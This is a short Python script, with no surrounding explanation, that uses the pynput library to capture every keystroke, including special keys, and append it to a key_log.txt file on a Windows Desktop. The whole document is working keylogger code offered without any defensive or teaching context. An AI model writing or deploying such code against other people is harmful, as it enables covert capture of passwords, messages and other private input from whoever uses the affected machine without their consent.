# Import necessary library
from pynput import keyboard

# Function to handle key press events
def on_press(key):
    try:
        # Try to log the character keys
        with open("C:\\Users\\User\\Desktop\\key_log.txt", "a") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        # Log special keys (like Enter, Shift, etc.)
        with open("C:\\Users\\User\\Desktop\\key_log.txt", "a") as log_file:
            log_file.write(f"{key}")

# Start listening to keystrokes
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
